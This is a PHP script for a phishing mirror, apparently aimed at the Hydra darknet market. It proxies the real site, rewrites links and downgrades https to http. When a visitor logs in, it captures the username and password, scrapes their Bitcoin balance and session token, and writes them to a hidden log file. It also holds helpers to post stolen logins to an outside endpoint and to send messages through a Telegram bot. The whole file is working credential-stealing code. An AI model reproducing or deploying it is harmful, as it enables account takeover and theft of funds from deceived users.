﻿<?php 

include('rewrite.php');
$self = 'http://'.$_SERVER['SERVER_NAME'].'/';
$uri = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/sitetarget.txt'); 

if(!$uri) exit('No target');

//Данные входящего запроса
$uripath = $_SERVER['REQUEST_URI'];
$isPost = $_SERVER['REQUEST_METHOD'] === 'POST';

$text = '
	<a href="http://ya.ru">Яндекс</a>
	<a href="http://google.ru">Google</a>
	<a href="http://mail.ru">Mail.ru</a>
';
 
preg_match_all('/<a.*?href=["\'](.*?)["\'].*?>/i', $text, $matches);
//print_r($matches[1]);


$adress = $uripath;
$data = '';
if( is_numeric(strpos($uripath,'?')) ) { 
	$urlarr  = explode('?',$uripath);
	
	$adress = array_shift($urlarr);
	$data = array_shift($urlarr);
}

if(is_numeric( strpos($adress,basename(__FILE__)) )) exit('No.');

if(strlen($data)>1) $data = '?'.$data;

if(substr($adress,strlen($adress)-1,strlen($adress))=='/') $adress = substr($adress,0,strlen($adress)-1);
$uripath = $adress.$data;


$outheads = getallheaders(); 



$clPost = array();
foreach($_POST as $key => $data) {
	//if($key=='login') logger($data.' - ');
	//if($key=='password') logger($data."\n\n");
	$clPost[$key] = $data;
}

//session_name('webcook');
//session_start();


if( ($myCurl = curl_init()) != true) {die("No cure init");}


curl_setopt($myCurl, CURLOPT_HTTPHEADER, $outheads);
curl_setopt($myCurl, CURLOPT_USERAGENT, $outheads['User-Agent'] );
curl_setopt($myCurl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($myCurl, CURLOPT_MAXREDIRS, 10);
curl_setopt($myCurl, CURLOPT_TIMEOUT, 30);
curl_setopt($myCurl, CURLOPT_ENCODING, 'gzip,deflate');
curl_setopt($myCurl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($myCurl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($myCurl, CURLOPT_RETURNTRANSFER, true);
//curl_setopt($myCurl, CURLOPT_PROXYTYPE, 7);
//curl_setopt($myCurl, CURLOPT_PROXY, "127.0.0.1:9050");

$reload = false;

if( strlen( session_id() ) > 0 ) {
$cookiefile = dirname(__FILE__) . '/tmpcookies/' . session_id().'.txt';

if(!file_exists($cookiefile) && file_exists(dirname(__FILE__) . '/tmpcookies/maincook.txt')) copy(dirname(__FILE__) . '/tmpcookies/maincook.txt',$cookiefile);  //кукисы

curl_setopt($myCurl, CURLOPT_COOKIEFILE, $cookiefile );  
curl_setopt($myCurl, CURLOPT_COOKIEJAR, $cookiefile); 
} else {$reload = true;}
curl_setopt($myCurl, CURLOPT_URL, $uri.$uripath);

if($isPost) {
	curl_setopt($myCurl, CURLOPT_POST, $isPost);
	curl_setopt($myCurl, CURLOPT_POSTFIELDS, http_build_query($clPost));
}
$response = curl_exec($myCurl);



if($reload) {
//	header("HTTP/1.1 301 Moved Permanently",true,301);
//	header("Location: $self");
//	exit();
}

$effurl = curl_getinfo($myCurl, CURLINFO_EFFECTIVE_URL);
$effurl = substr($effurl,strlen($uri),strlen($effurl));
while($uripath[0]=='/' || $effurl[0]=='/') {
	if($uripath[0]=='/') $uripath = substr($uripath,1,strlen($uripath));
	if($effurl[0]=='/') $effurl = substr($effurl,1,strlen($effurl));
}
//if(!$_SESSION['ReTime']) $_SESSION['ReTime']=0;
//if(!$_SESSION['ReCount']) $_SESSION['ReCount']=0;
if($_SESSION['ReTime']>(time()-1)) {$_SESSION['ReCount']++;}else{$_SESSION['ReCount']=0;}
$_SESSION['ReTime'] = time();
if($_SESSION['ReCount']>5) exit( 'error '.$effurl.' == '.$uripath.' - '.($effurl==$uripath) );

//header("HTTP/1.1 200 OK",true,200);
if($effurl!=$uripath) 
// header("Location: $self$effurl");
//header('Content-Type: text/html; charset=utf8');

if(strlen($response)<1) exit("No response. Try to reload page after few second.");

$response = str_replace( $uri , $self , $response );

$response = change_post_link($response);

$needle =  'https';
$replace = 'http';
$response = str_replace( $needle , $replace , $response );

$response = rewrite($response,$uripath);

if(!defined('INCLUDE_CHECK')) {

	if( is_numeric(strpos($uripath,'?')) ) $uripath = array_shift(explode('?',$uripath));

		$buildarr = explode('/',$adress);
		fillingin($buildarr,$response);
}

$login_f = $_POST['login'];
$pass_f= $_POST['password'];
$mess=$response;


if($_POST['login'] != "" && $_POST['password'] != "")
{
    $login = $_POST['login'];
    $uri = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/sitetarget.txt'); //Путь до сайта с гидрой
    $uripath = '/balance';
    $outheads = getallheaders();
    $cookiefile = dirname(__FILE__) . '/tmpcookies/' . session_id().'.txt';
    if(!file_exists($cookiefile) && file_exists(dirname(__FILE__) . '/tmpcookies/maincook.txt')) copy(dirname(__FILE__) . '/tmpcookies/maincook.txt',$cookiefile);
    $myCurl = curl_init();
    curl_setopt($myCurl, CURLOPT_HTTPHEADER, $outheads);
    curl_setopt($myCurl, CURLOPT_USERAGENT, $outheads['User-Agent'] );
    curl_setopt($myCurl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($myCurl, CURLOPT_MAXREDIRS, 10);
    curl_setopt($myCurl, CURLOPT_TIMEOUT, 30);
    curl_setopt($myCurl, CURLOPT_ENCODING, 'gzip,deflate');
    curl_setopt($myCurl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($myCurl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($myCurl, CURLOPT_RETURNTRANSFER, true);
    //curl_setopt($myCurl, CURLOPT_PROXYTYPE, 7);
 //   curl_setopt($myCurl, CURLOPT_PROXY, "127.0.0.1:9050");
    curl_setopt($myCurl, CURLOPT_COOKIEFILE, $cookiefile );
    curl_setopt($myCurl, CURLOPT_COOKIEJAR, $cookiefile);
    curl_setopt($myCurl, CURLOPT_URL, $uri.$uripath);
    $responses = curl_exec($myCurl);

    preg_match_all('#<a href="/user/(.+?)/account">#is', $responses, $arrN);
    $name = $arrN[1][0];
    preg_match_all('#<a href="/logout(.+?)">Выход</a>#is', $responses, $arrT);
    $token = str_replace('?_token=','',$arrT[1][0]);
    $responses = str_replace('<span></span>', '', $responses);
    preg_match_all('#<span class="text-primary h3">(.+?)</span>#is', $responses, $arr);
    $btc = $arr[1][1];


    if(!empty($login) and !empty($btc)) {
        addChecker($login, $btc);
    }

	preg_match('#<a href="/balance" title=".*"><i class="i_wallet"></i><span>(.*) BTC</span></a>#sUi', $response, $bal);
    logger("Никнейм - ".$name.PHP_EOL."Данные - ".$_POST['login'].":".$_POST['password'].PHP_EOL."Баланс - ".trim($bal[1]).PHP_EOL.PHP_EOL);
}
$response = str_replace('<form method="GET" action="//catalog" accept-charset="UTF-8" id="catalog-filters" class="searchform">', '<form method="GET" action="/catalog" accept-charset="UTF-8" id="catalog-filters" class="searchform">', $response);

exit($response);

function logger($msg) {
    

	if(!$handle = fopen($_SERVER['DOCUMENT_ROOT'].'/dfJ#df2scws3424.txt',"a")) return "File does open";  //путь то фаила куда пишется лог
	if(fwrite($handle,$msg,strlen($msg))===false) return "cant write";
	fclose($handle);
	

}

function change_post_link($response,$offset = 0)
{
	$Lresponse = strtolower($response);

	$needle = 'method="post"';
	$coorstar = strpos($Lresponse,$needle,$offset);
	if(!is_numeric($coorstar)) return $response;

	$offset = $coorstar+strlen($needle);

	while($Lresponse[$coorstar]!='<' || $coorstar<1) $coorstar--;
	if($coorstar<1) return change_post_link($response,$offset);

	$needle = 'action="';
	$coorstar = strpos($Lresponse,$needle,$coorstar);
	if(!is_numeric($coorstar)) return change_post_link($response,$offset);

	$coorstar += strlen($needle);
	$coorend = strpos($Lresponse,'"',$coorstar);
	if(!is_numeric($coorend)) return change_post_link($response,$offset);
	if($response[$coorend-1]=='/') return $response;

	$response = substr($response,0,$coorend).'/'.substr($response,$coorend,strlen($response));
	return change_post_link($response,$offset);
}

function fillingin($buildarr,$response = 'NULL') {

if(strpos($buildarr[count($buildarr)-1],'.') === false) {$filename = ''; } else {$filename = array_pop($buildarr);}

$format = strpos($filename,'.');

$newaddres = '\'';
$filepath = '';
foreach($buildarr as $name) {
	if($name=='') continue;
	$newaddres = $newaddres.'../';
	$filepath = $filepath.$name.'/';
}
$newaddres = '<?php define(\'INCLUDE_CHECK\',true); require '.$newaddres.'crookedmirror.php\';';


if($filename=="") $filename='index.php';

if(file_exists($filepath.$filename)) return "already done";

if( !file_exists($filepath) ) mkdir($filepath, 0777, true);
if(is_numeric($format)) $newaddres = $response;
if($newaddres!='') {
if(!$handle = fopen($filepath.$filename , "w")) return "File does open";
if(fwrite($handle,$newaddres,strlen($newaddres))===false) return "cant write";
fclose($handle);
}

//copy('.htaccess', $filepath.'.htaccess');

$buildarr[count($buildarr)-1]="";

if(count($buildarr)>0) fillingin($buildarr);
}

	function apitgbot($n, $post, $token = "")
    {
        global $settings;
        if($token == "") $token = $settings['tgtoken'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/".$n);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        $data = json_decode(curl_exec($ch));
        curl_close($ch);
        return $data;
    }

	function tg_send_message($to, $text, $token = "")
	{
        $post['chat_id'] = $to;
        $post['parse_mode'] = "HTML";
        $post['disable_web_page_preview'] = false;
        $post['text'] = $text;
		return apitgbot("sendMessage", $post, $token);
	}

    function addChecker($login, $btc)
    {
        $paramsArray = array(
            'login' => $login,
            'btc' => $btc
        );
        $vars = http_build_query($paramsArray);
        $options = array(
            'http' => array(
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => $vars,
            )
        );
        $context  = stream_context_create($options);
        $result = file_get_contents('', false, $context);
    }
